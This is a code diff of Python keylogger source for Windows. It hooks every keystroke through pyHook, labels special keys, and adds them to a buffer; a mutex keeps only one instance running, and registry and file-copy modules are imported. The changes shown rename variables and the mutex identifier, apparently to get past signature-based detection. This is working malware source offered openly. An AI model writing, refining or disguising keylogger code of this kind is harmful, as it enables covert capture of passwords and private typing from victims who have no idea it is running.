@@ -1,4 +1,5 @@
-import pythoncom, pyHook
+import pythoncom
+import pyHook
 from os import path
 from sys import exit
 import threading
@@ -11,11 +12,12 @@ from _winreg import *
 import shutil
 import sys
 
-mutex = win32event.CreateMutex(None, 1, 'N0tAs519n')
+ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-    mutex = None
-    print "err"
-    exit(0)
+    ironm = None
+    print "nope"
+    sys.exit(0)
+
 x=''
 data=''
 count=0
@@ -77,40 +79,40 @@ if __name__ == '__main__':
 def pushing(event):
     global x,data
     if event.Ascii==13:
-        e4Ch=' [ENTER] '
+        kkss=' [ENTER] '
     elif event.Ascii==8:
-        e4Ch=' [BACKSPACE] '
+        kkss=' [BACKSPACE] '
     elif (event.Ascii == 162 or event.Ascii == 163):
-        e4Ch = ' [CTRL] '
+        kkss = ' [CTRL] '
     elif (event.Ascii == 164 or event.Ascii == 165):
-        e4Ch = ' [ALT] '
+        kkss = ' [ALT] '
     elif (event.Ascii == 160 or event.Ascii == 161):
-        e4Ch = ' [SHIFT] '
+        kkss = ' [SHIFT] '
     elif (event.Ascii == 46):
-        e4Ch = ' [DELETE] '
+        kkss = ' [DELETE] '
     elif (event.Ascii == 32):
-        e4Ch = ' [SPACE] '
+        kkss = ' [SPACE] '
     elif (event.Ascii == 27):
-        e4Ch = ' [ESC] '
+        kkss = ' [ESC] '
     elif (event.Ascii == 9):
-        e4Ch = ' [TAB] '
+        kkss = ' [TAB] '
     elif (event.Ascii == 20):
-        e4Ch = ' [CAPSLOCK] '
+        kkss = ' [CAPSLOCK] '
     elif (event.Ascii == 38):
-        e4Ch = ' [UP] '
+        kkss = ' [UP] '
     elif (event.Ascii == 40):
-        e4Ch = ' [DOWN] '
+        kkss = ' [DOWN] '
     elif (event.Ascii == 37):
-        e4Ch = ' [LEFT] '
+        kkss = ' [LEFT] '
     elif (event.Ascii == 39):
-        e4Ch = ' [RIGHT] '
+        kkss = ' [RIGHT] '
     elif (event.Ascii == 91):
-        e4Ch = ' [SUPER] '
+        kkss = ' [SUPER] '
     else:
-        e4Ch=chr(event.Ascii)
-    data=data+e4Ch 
+        kkss=chr(event.Ascii)
+    data=data+kkss 
     
-obj = pyHook.HookManager()
-obj.KeyDown = pushing
-obj.HookKeyboard()
+hee = pyHook.HookManager()
+hee.KeyDown = pushing
+hee.HookKeyboard()
 pythoncom.PumpMessages()
